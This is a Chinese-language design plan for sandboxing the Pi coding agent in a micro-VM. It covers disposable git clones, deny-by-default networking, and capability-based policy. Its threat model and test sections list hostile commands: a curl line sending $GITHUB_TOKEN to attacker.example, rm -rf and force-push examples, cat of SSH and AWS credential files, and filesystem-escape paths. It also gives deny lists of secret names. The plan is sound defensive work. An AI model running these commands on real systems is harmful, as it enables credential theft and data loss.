# Pi Agent 日常开发沙箱模式：完整实施计划

## 1. 最终目标

实现一个默认适合日常开启的 Pi Agent 沙箱：

```text
pi --sandbox=dev
```

应满足以下核心不变量：

1. **Pi、LLM 认证、session、TUI 留在 Host。**
2. **模型能调用的文件/命令类 capability 全部进入隔离环境。**
3. **Agent 不直接操作用户当前 checkout。**
4. **Host secrets 默认不进入 sandbox。**
5. **网络默认 deny，按域名或 capability 授权。**
6. **Agent 可以自由修改、测试、安装依赖、commit。**
7. **push、部署、修改真实工作区等 Host side effects 默认不属于普通 Agent capability。**
8. **任意崩溃、超时或 session 中断都不能破坏主工作区。**
9. **沙箱状态必须始终在 UI 中可见。**
10. **未知自定义工具默认不得绕过沙箱。**

Pi 当前默认继承启动用户的权限；官方安全文档也建议在需要权限边界时使用容器、VM、micro-VM 或受策略控制的 sandbox，并强调 RW bind mount 仍会修改宿主机文件。

---

# 2. 产品范围

## 2.1 第一版支持

首版重点支持：

* macOS / Linux 开发机
* Git repository
* Node.js / TypeScript
* Python
* Rust
* Go
* 常规 shell 工具
* dev server
* package manager dependency cache
* Git diff / commit / fetch
* npm / PyPI / GitHub 等受限网络访问
* Pi built-in：

  * `read`
  * `write`
  * `edit`
  * `bash`
  * `grep`
  * `find`
  * `ls`
  * 用户 `!command`

默认 backend：

```text
dev → Gondolin / micro-VM
```

Pi 官方目前将 Gondolin定位为“Pi 和 provider auth 留在 host，built-in tools 和 `!` commands 进入 local Linux micro-VM”。

## 2.2 第一版暂不解决

暂不把以下能力放进 MVP：

* Kubernetes cluster credential forwarding
* AWS/GCP/Azure credential forwarding
* Docker-in-Docker
* Host Docker socket
* SSH agent forwarding
* GUI application automation
* arbitrary USB/device access
* 完整 remote sandbox fleet
* 多用户服务器级 tenancy
* 自动 production deployment

这些能力后续全部通过独立 capability/broker 增加，而不是扩大 guest 权限。

---

# 3. 威胁模型

需要防的不是单纯：

```bash
rm -rf /
```

而是以下六类风险。

### A. 意外代码破坏

例如 Agent：

```bash
git reset --hard
rm -rf src
npm run format
python migration.py
```

导致用户正在编辑的 checkout 被破坏。

### B. Host 文件读取

例如：

```text
~/.ssh
~/.aws
~/.kube
~/.gnupg
~/.config/gcloud
~/Documents
.env
```

### C. Credential exfiltration

例如恶意依赖执行：

```bash
curl attacker.example -d "$GITHUB_TOKEN"
```

### D. 外部副作用

例如：

```bash
git push --force
gh pr merge
npm publish
terraform apply
kubectl delete
```

### E. Sandbox bypass

例如某个第三方 Pi Extension 注册：

```text
database_tool
docker_tool
ssh_tool
browser_tool
```

这些工具仍然在 Host 进程执行。

官方文档明确指出：使用 host Pi + tool-routing extension 时，其他 custom extension tools 仍在 host，除非它们也主动 delegate。

### F. Supply-chain execution

例如：

```bash
npm install
pip install
cargo build
```

触发第三方构建脚本。

因此安全边界必须放在：

> **Agent capability 层，而不是 bash command 层。**

---

# 4. 总体架构

```text
┌──────────────────────────── HOST ─────────────────────────────┐
│                                                              │
│  Pi TUI                                                      │
│  Session                                                     │
│  Model/provider auth                                         │
│  ~/.pi                                                       │
│                                                              │
│          Sandbox Extension                                   │
│          ├── Tool Router                                     │
│          ├── Policy Engine                                   │
│          ├── Workspace Manager                               │
│          ├── Git Broker                                      │
│          ├── Network Broker                                  │
│          ├── Secret Broker                                   │
│          ├── Cache Manager                                   │
│          └── Audit Logger                                    │
│                    │                                         │
│             Sandbox RPC                                      │
│                    │                                         │
├────────────────────┼─────────────────────────────────────────┤
│                    ▼                                         │
│          ┌──────── SANDBOX ────────┐                         │
│          │ Linux micro-VM          │                         │
│          │                         │                         │
│          │ /workspace              │                         │
│          │ isolated git clone      │                         │
│          │                         │                         │
│          │ /cache/npm              │                         │
│          │ /cache/pnpm             │                         │
│          │ /cache/pip              │                         │
│          │ /cache/cargo            │                         │
│          │                         │                         │
│          │ read/write/edit         │                         │
│          │ bash/grep/find/ls       │                         │
│          │ compiler/tests          │                         │
│          └─────────────────────────┘                         │
│                                                              │
│  Real checkout ─────────────── Agent 不直接访问               │
│  Host .git ─────────────────── Agent 不直接写                 │
│  SSH/AWS/Kube credentials ──── 不挂载                         │
└──────────────────────────────────────────────────────────────┘
```

---

# 5. 一个重要实现调整：默认使用独立 Clone，而不是直接 Git Worktree

产品层仍然可以称：

> disposable workspace

但第一版建议实际实现为 **standalone ephemeral clone**。

原因是标准 Git worktree 中：

```text
workspace/.git
```

通常会指向主 repository：

```text
main-repo/.git/worktrees/xxx
```

如果为了让 sandbox 内 Git 正常工作而暴露这部分 metadata，就又把主 repository 的 `.git` 状态纳入了攻击面。

因此默认方案调整为：

```text
~/src/foo
    │
    │ host-side clone
    ▼
~/.cache/pi-sandbox/workspaces/<session-id>/repo
    │
    │ mount only this
    ▼
/workspace
```

创建：

```bash
git clone --no-hardlinks <local-repository> <sandbox-workspace>
```

然后：

```bash
git checkout <base-commit>
```

如此 sandbox 拥有自己的：

```text
.git/
objects/
index
refs/
config
```

对主 checkout 零写入。

## 可选 fast backend

以后可以增加：

```yaml
workspace:
  strategy: worktree
```

但不作为安全默认值。

---

# 6. 未提交修改的处理

日常开发非常关键的一点是：用户启动 Pi 时，当前 checkout 很可能已经有修改。

不能简单 clone `HEAD`。

启动时 Host Workspace Manager 执行：

```text
HEAD
 │
 ├── staged diff
 ├── unstaged diff
 └── untracked non-ignored files
```

生成一个 workspace snapshot。

流程：

```text
git clone HEAD
        │
        ▼
apply staged snapshot
        │
        ▼
apply unstaged snapshot
        │
        ▼
copy safe untracked files
```

建议使用：

```bash
git diff --binary HEAD
```

捕获 tracked modifications。

untracked 使用：

```bash
git ls-files --others --exclude-standard
```

只复制 Git 没有 ignore 的文件。

这样天然不会把多数：

```text
.env
node_modules
credentials
local secret files
```

复制进去。

再额外经过 sandbox deny policy。

记录：

```yaml
workspaceSnapshot:
  baseCommit: abc123
  dirty: true
  files: 17
```

Agent 看到的是：

> 启动 Pi 时用户工作区的一个不可逆向影响 Host 的快照。

---

# 7. Extension 实现方式

不建议第一阶段 fork Pi core。

首先做标准 Pi package：

```text
pi-sandbox/
├── package.json
├── src/
│   ├── index.ts
│   ├── config/
│   ├── policy/
│   ├── workspace/
│   ├── backend/
│   ├── tools/
│   ├── brokers/
│   ├── cache/
│   ├── audit/
│   └── ui/
└── tests/
```

Pi Extension 当前支持：

* `registerTool`
* `tool_call` interception
* `setActiveTools`
* custom commands
* session lifecycle
* TUI status/widgets

因此不需要第一版修改 Agent loop。

---

# 8. 核心模块划分

## 8.1 `SandboxController`

统一生命周期：

```ts
interface SandboxController {
  start(spec: SandboxSpec): Promise<SandboxSession>;
  exec(req: ExecRequest): Promise<ExecResult>;
  stop(): Promise<void>;
}
```

负责：

```text
create
start
health check
exec
kill
cleanup
```

---

## 8.2 `SandboxBackend`

隔离具体 backend：

```ts
interface SandboxBackend {
  readonly name: string;

  create(spec: SandboxSpec): Promise<SandboxInstance>;

  exec(
    instance: SandboxInstance,
    request: SandboxExecRequest
  ): Promise<SandboxExecResult>;

  destroy(instance: SandboxInstance): Promise<void>;
}
```

实现：

```text
backend/
├── gondolin.ts
├── os-sandbox.ts       # 后续 fast
├── docker.ts           # 后续
└── openshell.ts        # strict
```

第一版只要求 Gondolin driver 完整通过测试。

---

# 9. Tool Router

这是最重要的代码。

Agent 的所有 active tools 分成三个 execution domain：

```ts
type ExecutionDomain =
  | "sandbox"
  | "host-safe"
  | "host-privileged";
```

## Sandbox tools

```text
read
write
edit
bash
grep
find
ls
user_bash
```

必须全部进入 micro-VM。

## Host-safe

只允许明确没有外部副作用的 Host UI/session 操作。

例如：

```text
sandbox_status
sandbox_diff
```

## Host-privileged

例如：

```text
git_apply
git_push
open_host_file
deploy
secret_access
```

不能作为普通工具自动开放。

---

# 10. 未知 Extension 工具处理

这是整个方案最容易漏掉的安全漏洞。

session 启动时：

```ts
const tools = pi.getAllTools();
```

检查全部工具。

配置 registry：

```ts
const domainRegistry = {
  read: "sandbox",
  write: "sandbox",
  edit: "sandbox",
  bash: "sandbox",
  grep: "sandbox",
  find: "sandbox",
  ls: "sandbox",

  sandbox_status: "host-safe",
};
```

任何未知工具：

```text
execution domain = unknown
```

在 `dev` 模式：

```text
unknown → disabled
```

UI 显示：

```text
Sandbox blocked 2 unclassified tools:

- docker
- ssh

Use /sandbox tools to inspect.
```

绝对不能：

```text
unknown → host
```

这保证第三方 Pi Extension 不能无意绕过隔离。

---

# 11. Policy Engine

统一策略接口：

```ts
interface PolicyEngine {
  authorize(
    principal: Principal,
    capability: Capability,
    context: PolicyContext
  ): PolicyDecision;
}
```

决策：

```ts
type PolicyDecision =
  | { action: "allow" }
  | { action: "deny"; reason: string }
  | { action: "prompt"; scope: GrantScope };
```

Capability 不以 command string 表示。

例如：

```text
filesystem.read:/workspace/**
filesystem.write:/workspace/**
network.connect:registry.npmjs.org:443
git.commit
git.fetch
git.push
secret.github
host.apply_patch
```

这样策略从：

```text
“rm -rf 是不是危险”
```

提升成：

```text
“这个主体是否有能力修改这个资源”
```

---

# 12. Policy 配置

建议：

```yaml
version: 1

mode: dev

workspace:
  strategy: clone
  includeWorkingChanges: true
  disposable: true

filesystem:
  workspace: rw
  tmp: rw

  denyRead:
    - "**/.env"
    - "**/.env.*"
    - "**/*.pem"
    - "**/*.key"

network:
  default: deny

  allow:
    - registry.npmjs.org
    - "*.npmjs.org"
    - github.com
    - api.github.com
    - raw.githubusercontent.com

environment:
  inherit: false

  allow:
    - PATH
    - LANG
    - LC_ALL
    - TERM
    - HOME
    - CI
    - NODE_ENV

git:
  status: allow
  diff: allow
  commit: allow
  fetch: allow
  push: deny
  forcePush: deny

process:
  sudo: false
  hostPid: false
  ptrace: false
  hostNetwork: false
  dockerSocket: false

resources:
  cpuLimit: auto
  memoryLimit: auto
  diskLimit: auto

cache:
  npm: true
  pnpm: true
  pip: true
  cargo: true
  go: true
```

---

# 13. 配置优先级

建议：

```text
built-in secure defaults
        ↓
~/.pi/agent/sandbox.yaml
        ↓
.pi/sandbox.yaml
```

但合并不是简单 override。

关键原则：

> **Project policy 默认只能收紧 Global policy，不能静默提升权限。**

例如 Global：

```yaml
network:
  allow:
    - github.com
```

项目文件写：

```yaml
network:
  allow:
    - internal-production-db.example.com
```

不得自动生效。

应该显示：

```text
Project requests additional capability:

network.connect:
  internal-production-db.example.com

[deny] [allow once] [allow project]
```

否则攻击者只需往恶意 repository 提交：

```text
.pi/sandbox.yaml
```

就能自行扩大权限。

---

# 14. Filesystem 策略

Sandbox 内原则上只存在：

```text
/workspace   rw
/tmp         rw
/cache       controlled-rw
```

不要挂载：

```text
$HOME
~/.ssh
~/.aws
~/.kube
~/.docker
~/.gnupg
~/.config/gcloud
/var/run/docker.sock
SSH_AUTH_SOCK
```

HOME 设置成 sandbox 自己的：

```text
/home/pi
```

并确保：

```bash
echo $HOME
```

不会返回 Host home。

---

# 15. 环境变量

严禁：

```ts
env: process.env
```

改为：

```ts
function buildGuestEnv(hostEnv: NodeJS.ProcessEnv) {
  return pick(hostEnv, [
    "LANG",
    "LC_ALL",
    "TERM",
    "CI",
    "NODE_ENV",
  ]);
}
```

由 sandbox runtime 自己提供：

```text
PATH
HOME
TMPDIR
PWD
```

额外做敏感名称 deny：

```text
*_TOKEN
*_SECRET
*_PASSWORD
*_KEY
AWS_*
GITHUB_TOKEN
NPM_TOKEN
OPENAI_API_KEY
ANTHROPIC_API_KEY
SSH_AUTH_SOCK
```

即使用户错误加入通用 env inheritance，也需要第二层拦截。

---

# 16. Secret Broker

不要把 secrets 注入 guest。

需要 credential 的操作以后实现：

```text
sandbox
   │
   │ structured request
   ▼
Host Broker
   │
   │ inject short-lived credential
   ▼
External Service
```

例如未来 GitHub：

```text
Agent:
create_pull_request(...)

        ↓

GitHubBroker

        ↓

Host credential

        ↓

GitHub API
```

Agent 永远拿不到 token 明文。

第一版：

```text
secret broker 默认关闭
```

---

# 17. 网络模型

## 默认

```text
network.default = deny
```

按生态开启：

### Node

```text
registry.npmjs.org
*.npmjs.org
```

### Python

```text
pypi.org
files.pythonhosted.org
```

### GitHub

```text
github.com
api.github.com
raw.githubusercontent.com
```

### Rust

```text
crates.io
static.crates.io
```

## 动态网络授权

第一次访问：

```text
api.foo.dev
```

若 blocked：

```text
Sandbox blocked network access

Host:
  api.foo.dev

Reason:
  curl requested by bash

[Allow once]
[Allow for project]
[Deny]
```

授权对象是：

```text
domain + port + protocol
```

而不是：

```text
allow all internet
```

---

# 18. Git 模型

Sandbox 内：

```text
git status      allow
git diff        allow
git log         allow
git add         allow
git commit      allow
git fetch       conditional
git push        deny
```

Host 与 sandbox Git repository 完全分离。

Agent 可以：

```bash
git commit -am "fix parser"
```

但 commit 只存在 sandbox clone。

---

# 19. 将修改应用回真实 repository

这一动作应当是 **用户命令，而不是默认 LLM tool**。

例如：

```text
/sandbox diff
/sandbox apply
```

流程：

```text
Sandbox commits
      │
      ▼
Host verifies base commit
      │
      ▼
Host imports commit object/patch
      │
      ▼
Conflict check
      │
      ▼
User confirmation
      │
      ▼
Real checkout
```

若 main checkout 自 Agent 启动后发生变化：

```text
base != current
```

必须进行 conflict detection。

不得静默：

```text
git reset
git checkout
git clean
```

---

# 20. 推荐 Apply 策略

优先导出 binary-safe patch：

```bash
git diff --binary <sandbox-base>..HEAD
```

然后 host 先执行 dry run：

```bash
git apply --check
```

通过后才允许：

```bash
git apply
```

如果希望保留 Agent commits，则提供：

```text
/sandbox import-commits
```

由 Host 从 sandbox repo fetch commit，然后用户决定 cherry-pick。

---

# 21. Push / PR

第一版：

```text
git push → blocked
```

后续不要简单给 guest GitHub token。

增加 Host privileged capability：

```text
publish_branch
create_pull_request
```

执行链：

```text
Agent request
     ↓
Policy
     ↓
User confirmation
     ↓
Host Git/GitHub Broker
```

并明确显示：

```text
Repository: foo/bar
Branch: pi/fix-parser
Commits: 2
Remote: origin

[Publish]
[Cancel]
```

---

# 22. Dependency Cache

日常沙箱是否好用，很大程度取决于这个部分。

持久化：

```text
/cache/npm
/cache/pnpm
/cache/yarn
/cache/pip
/cache/cargo
/cache/go
```

不持久化：

```text
/workspace
/tmp
processes
guest HOME
```

即：

```text
environment = disposable
dependency downloads = reusable
```

---

# 23. Cache 安全

缓存本身也是攻击面。

规则：

1. cache 从不作为 Host executable path。
2. Host 不执行 cache 中二进制。
3. cache 不允许存 Host secrets。
4. 根据 toolchain 分目录。
5. 支持 GC。
6. `strict` 模式禁用跨项目 writable cache。
7. cache 不能包含通向 Host 的 symlink。
8. sandbox mount 后验证真实路径仍处于 cache root。

例如：

```text
~/.cache/pi-sandbox/
├── npm/
├── pnpm/
├── pip/
├── cargo/
└── go/
```

---

# 24. Dev Server

Agent 经常需要：

```bash
npm run dev
vite
next dev
python -m http.server
```

需要专门处理。

Sandbox 分配受控 port：

```text
guest :3000
   ↓
port forward
   ↓
127.0.0.1:<random-host-port>
```

只监听：

```text
127.0.0.1
```

默认不能：

```text
0.0.0.0
LAN
public internet
```

UI：

```text
🔒 Sandbox
Web: http://127.0.0.1:43127
```

session 退出：

```text
terminate process tree
close forward
```

---

# 25. Process 生命周期

SandboxController 保存：

```ts
interface ProcessRecord {
  pid: number;
  command: string;
  startedAt: number;
  foreground: boolean;
}
```

session shutdown：

```text
SIGTERM
  ↓
grace cleanup
  ↓
SIGKILL
  ↓
destroy VM
```

异常退出后，下次启动运行 orphan GC：

```text
~/.cache/pi-sandbox/runtime/*
```

检查：

```text
owner PID
session ID
creation timestamp
backend state
```

并清理失效实例。

---

# 26. UI / UX

Footer 永久显示：

```text
🔒 dev | clone | net:restricted | host-write:off
```

不要只在启动时打印一次。

## Commands

```text
/sandbox status
/sandbox diff
/sandbox files
/sandbox network
/sandbox tools
/sandbox processes
/sandbox reset
/sandbox apply
/sandbox destroy
```

## CLI

```bash
pi --sandbox=dev
pi --sandbox=fast
pi --sandbox=strict
pi --sandbox=off
```

最终如果验证成熟，可让：

```text
dev
```

成为默认。

---

# 27. 三个 Mode

| Mode     | Workspace               | Execution    | Network         | Host effects    |
| -------- | ----------------------- | ------------ | --------------- | --------------- |
| `fast`   | 当前 workspace            | OS sandbox   | restricted      | limited         |
| `dev`    | disposable clone        | micro-VM     | deny-by-default | broker only     |
| `strict` | copied/remote workspace | full sandbox | deny-by-default | none by default |

默认推荐：

```text
dev
```

`fast` 明确标：

```text
⚠ host workspace writable
```

---

# 28. Audit Log

记录 capability，不需要记录 secret 内容。

例如：

```json
{
  "timestamp": "...",
  "session": "...",
  "principal": "agent",
  "capability": "network.connect",
  "resource": "registry.npmjs.org:443",
  "decision": "allow"
}
```

以及：

```text
sandbox started
workspace snapshot created
tool executed
network denied
privilege requested
workspace exported
sandbox destroyed
```

位置：

```text
~/.pi/agent/sandbox-logs/
```

默认做 rotation。

---

# 29. 安全测试矩阵

上线前必须建立 adversarial integration suite。

## Filesystem escape

测试：

```text
../../../../etc/passwd
absolute host path
symlink escape
hard link
nested symlink
/proc/self/root
/proc/1/root
/dev/*
```

预期：

```text
DENIED / nonexistent
```

## Secrets

Sandbox 执行：

```bash
env
cat ~/.ssh/id_rsa
cat ~/.aws/credentials
cat ~/.kube/config
```

必须失败。

## Host workspace

Sandbox：

```bash
rm -rf /workspace/*
```

执行后真实 checkout：

```text
unchanged
```

## Network

测试：

```bash
curl example.com
curl registry.npmjs.org
```

默认：

```text
example.com → deny
registry.npmjs.org → allow
```

## Process

测试：

```text
fork bomb constraints
background process
daemon
child process
session crash
```

session 后不得残留 Host process。

## Docker escape

确认：

```text
/var/run/docker.sock
```

不存在。

## Extension bypass

加载一个测试 Extension：

```text
host_read
```

未注册 execution domain。

dev sandbox 必须：

```text
disabled
```

这是 release blocker。

---

# 30. Git 测试矩阵

覆盖：

```text
clean repo
dirty repo
staged changes
unstaged changes
untracked files
ignored .env
binary files
renames
deleted files
symlinks
submodules
Git LFS
nested repositories
detached HEAD
large repository
branch changed while sandbox running
host changed same lines
```

特别要求：

```text
ignored secret file
```

绝不能因为 workspace snapshot 被复制进去。

---

# 31. Policy Engine 单元测试

重点测试：

```text
path canonicalization
wildcard matching
domain matching
port matching
symlink resolution
environment filtering
config precedence
project privilege widening
unknown tool classification
one-time grants
persistent grants
```

任何：

```text
fail open
```

都视为安全 bug。

原则：

> policy error = deny

而不是：

> policy error = allow

---

# 32. 实施阶段

## Phase 0 — Security invariants

产出：

```text
SECURITY.md
THREAT-MODEL.md
ARCHITECTURE.md
```

冻结以下原则：

* no host checkout access
* no host env inheritance
* no host credential mount
* unknown tools disabled
* project policy cannot silently widen privilege
* privileged host mutation cannot fail open

### 验收

团队能够明确回答：

```text
“哪段代码构成 security boundary？”
```

答案必须唯一且可审计。

---

## Phase 1 — Extension Skeleton

实现：

```text
Pi extension bootstrap
CLI flag
session lifecycle
footer status
/sandbox status
configuration loader
audit logger
```

### 验收

运行：

```bash
pi --sandbox=dev
```

可以看到：

```text
🔒 dev
```

并创建/销毁一个空 sandbox session。

---

## Phase 2 — Workspace Manager

实现：

```text
Git root detection
base commit capture
standalone clone
dirty diff capture
untracked safe-file copy
workspace cleanup
```

### 验收

在 dirty repository 启动后：

```text
sandbox content = launch-time snapshot
real checkout unchanged
```

---

## Phase 3 — Built-in Tool Routing

实现：

```text
read
write
edit
bash
grep
find
ls
!
```

全部通过 `SandboxBackend`。

### 验收

Agent：

```text
read ~/.ssh/config
```

无法触达 Host。

Agent：

```bash
rm -rf /workspace
```

不能影响真实 repo。

---

## Phase 4 — Tool Classification

实现：

```text
execution-domain registry
unknown tool detector
setActiveTools filtering
/sandbox tools
```

### 验收

第三方 host tool 默认不可被模型调用。

---

## Phase 5 — Policy Engine

实现：

```text
filesystem policy
process policy
env policy
config intersection
temporary grants
```

### 验收

所有 policy 单元测试通过，并执行 fail-closed。

---

## Phase 6 — Network Isolation

实现：

```text
deny-by-default
domain allowlist
runtime network request
allow once
allow project
audit
```

### 验收

未授权域名无法建立连接。

---

## Phase 7 — Git Broker

实现：

```text
sandbox diff
export patch
git apply --check
/sandbox apply
conflict handling
```

### 验收

正常修改可以安全回到 Host；

Host 自启动后发生冲突时，不自动覆盖。

---

## Phase 8 — Cache + Developer Experience

实现：

```text
npm/pnpm/pip/cargo/go cache
port forwarding
dev server detection
process cleanup
warm sandbox
```

### 验收

常规：

```bash
pnpm install
pnpm test
pnpm dev
```

能够在 sandbox 中完成。

---

## Phase 9 — Hardening

运行完整攻击测试：

```text
filesystem escape
env exfiltration
network exfiltration
process escape
extension bypass
git attack surface
cache poisoning
crash recovery
```

所有 privilege-boundary bug 都是 release blocker。

---

## Phase 10 — Packaging

作为 Pi Package 发布：

```text
@org/pi-sandbox
```

支持：

```bash
pi install npm:@org/pi-sandbox
```

Extension/package 本身拥有 Host 权限，因此安装来源必须可信；Pi 官方 Extension 文档也明确提示 Extension 会以完整系统权限运行。

---

# 33. 推荐源码目录

```text
src/
├── index.ts
│
├── config/
│   ├── schema.ts
│   ├── defaults.ts
│   ├── loader.ts
│   └── merge.ts
│
├── policy/
│   ├── engine.ts
│   ├── capability.ts
│   ├── filesystem.ts
│   ├── network.ts
│   ├── process.ts
│   └── environment.ts
│
├── workspace/
│   ├── manager.ts
│   ├── git.ts
│   ├── snapshot.ts
│   ├── clone.ts
│   └── export.ts
│
├── backend/
│   ├── types.ts
│   └── gondolin.ts
│
├── tools/
│   ├── router.ts
│   ├── registry.ts
│   ├── read.ts
│   ├── write.ts
│   ├── edit.ts
│   ├── bash.ts
│   ├── grep.ts
│   ├── find.ts
│   └── ls.ts
│
├── brokers/
│   ├── git.ts
│   ├── network.ts
│   └── secrets.ts
│
├── cache/
│   ├── manager.ts
│   └── gc.ts
│
├── audit/
│   ├── logger.ts
│   └── events.ts
│
└── ui/
    ├── status.ts
    ├── commands.ts
    └── prompts.ts
```

---

# 34. 最关键的数据结构

```ts
interface SandboxSession {
  id: string;
  mode: SandboxMode;

  workspace: {
    hostSource: string;
    sandboxPath: string;
    baseCommit: string;
    snapshotHash: string;
  };

  backend: {
    type: string;
    instanceId: string;
  };

  policy: EffectivePolicy;

  grants: CapabilityGrant[];

  startedAt: number;
}
```

Capability：

```ts
interface Capability {
  namespace:
    | "filesystem"
    | "network"
    | "process"
    | "git"
    | "secret"
    | "host";

  action: string;
  resource?: string;
}
```

---

# 35. Default Policy

最终推荐产品默认值：

```text
filesystem:
    isolated workspace rw

network:
    deny except ecosystem registries

env:
    no host inheritance

secrets:
    none

git:
    local operations yes
    remote mutation no

custom tools:
    unknown disabled

workspace:
    disposable

cache:
    persistent

host apply:
    explicit user action
```

这组默认值才能达到：

> **Agent 可以大胆干活，但影响范围天然有限。**

---

# 36. Definition of Done

只有以下条件全部满足，才能把 `dev sandbox` 标记为稳定：

* [ ] `read/write/edit/bash/grep/find/ls/!` 全部经过 sandbox boundary
* [ ] 未知 custom tools 无法默认在 Host 执行
* [ ] Host `$HOME` 对 guest 不可见
* [ ] Host secrets 不出现在 guest env
* [ ] Docker/SSH agent socket 未暴露
* [ ] Agent 删除整个 `/workspace` 不影响主 repo
* [ ] dirty workspace snapshot 正确
* [ ] ignored `.env` 不被复制
* [ ] 网络默认 deny
* [ ] allowlist 正常工作
* [ ] sandbox Git commit 正常
* [ ] sandbox Git push 默认失败
* [ ] `/sandbox apply` 有 dry-run/conflict detection
* [ ] session crash 后无残留 guest process
* [ ] stale sandbox 可以 GC
* [ ] cache 不形成 Host escape
* [ ] project config 不能静默扩大权限
* [ ] policy failure 均 fail-closed
* [ ] adversarial integration tests 全部通过

---

# 37. 实际开发优先级

如果立即开始编码，严格按下面顺序，不要先做高级 UI 或 secret broker：

```text
1. Sandbox Extension skeleton
          ↓
2. Standalone Git workspace
          ↓
3. Gondolin backend
          ↓
4. Built-in tool routing
          ↓
5. Unknown-tool lockdown
          ↓
6. Filesystem/env policy
          ↓
7. Network deny/allow
          ↓
8. Git export/apply
          ↓
9. Cache + dev server
          ↓
10. Security hardening
          ↓
11. Host brokers
          ↓
12. strict/fast alternative backends
```

其中 **1–8 是真正的 MVP**。

secret broker、PR creation、cloud credentials 都应该后置，因为它们不是“沙箱基本可用”的前提，而且会显著扩大 security boundary。

---

# 38. 最终架构决策

第一版明确采用：

```text
Pi Host Process
        +
Pi Sandbox Extension
        +
Gondolin Backend
        +
Standalone Disposable Git Clone
        +
Capability Policy Engine
        +
Deny-by-default Network
        +
No Guest Secrets
        +
Host-side Apply Broker
```

而不是：

```text
bash blacklist
```

也不是：

```text
直接把当前 repository RW mount 到 VM
```

也不是：

```text
把 process.env 全部传进去
```

更不是：

```text
只要叫 sandbox 就默认所有 Extension 都安全
```

这会形成一个边界清晰、可以逐渐扩展、同时足够适合日常开发的 Pi Agent sandbox architecture。

